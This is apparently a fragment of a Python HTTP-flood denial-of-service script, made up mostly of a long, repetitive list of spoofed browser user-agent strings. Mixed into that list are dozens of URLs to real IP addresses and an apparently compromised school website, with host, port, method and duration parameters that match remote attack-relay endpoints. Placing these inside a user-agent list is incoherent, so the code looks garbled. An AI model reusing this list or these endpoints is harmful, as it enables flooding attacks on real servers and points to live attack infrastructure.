	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020509)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020513)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020605)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020612)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020619)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020721)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020820)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020917)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020925)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021011)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021014)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021020)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021128)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021221)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020421)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020426)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020510)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020520)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020607)')
		headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020709)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020716)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020725)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020926)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021004)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021025)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021110)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021125)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021204)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021210)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021223)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020420)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020511)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020521)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020602)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020714)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020718)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020811)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020824)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020827)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020901)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020913)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020928)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021026)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021114)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021124)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021204)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021208)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021217)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020524)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020601)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020606)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020615)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020621)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020625)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020712)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020819)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020823)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020906)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020910)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020913)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020927)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021001)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021112)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021127)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021212)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021219)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021224)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020607)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020624)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020626)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020815)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020822)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020828)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020907)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021002)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021006)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021019)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021105)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021113)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021124)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021203)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021219)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020509)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020513)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020605)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020612)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020619)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020721)')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://109.123.81.73/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://74.118.193.43/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://173.242.119.195/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://66.197.220.246/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://204.124.183.106/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://96.47.239.14/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://198.245.63.152/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('http://80.82.64.225/send.php?type=$method&host=$host&port=$port&time=$time')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020820)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020917)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20020925)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021011)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021014)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021020)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021128)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc2; i686 Linux; 20021221)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020421)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020426)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020510)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020520)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020607)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020709)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020716)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020725)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020818)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020926)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021004)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021025)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021110)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021125)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021204)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021210)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021223)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020420)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020511)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020521)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020602)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020714)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020718)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020808)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020811)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020824)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020827)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020901)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020912)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020913)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20020928)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021026)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021114)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021124)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021204)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021208)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc4; i686 Linux; 20021217)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020524)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020601)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020606)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020615)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020621)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020625)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020712)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020809)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020819)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020823)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020906)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020910)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020913)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020927)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021001)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021112)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021127)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021212)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021219)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20021224)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020607)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020614)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020624)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020626)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020815)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020822)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020828)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020905)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020907)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20020915)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021002)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021006)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021019)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021105)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021113)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021119)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021124)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021203)')
	 	headers_useragents.append('Mozilla/5.0 (compatible; Konqueror/3.1-rc6; i686 Linux; 20021219)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b2pre) Gecko/2007112704 Minefield/3.0b2pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3) Gecko/2008020513 Firefox/3.0b3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3) Gecko/2008021322 Minefield/3.0b3')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008010404 Minefield/3.0b3pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008010415 Firefox/3.0b')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b3pre) Gecko/2008020507 Firefox/3.0b3pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021712 Firefox/3.0b4pre (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021714 Firefox/3.0b4pre (Swiftfox)')
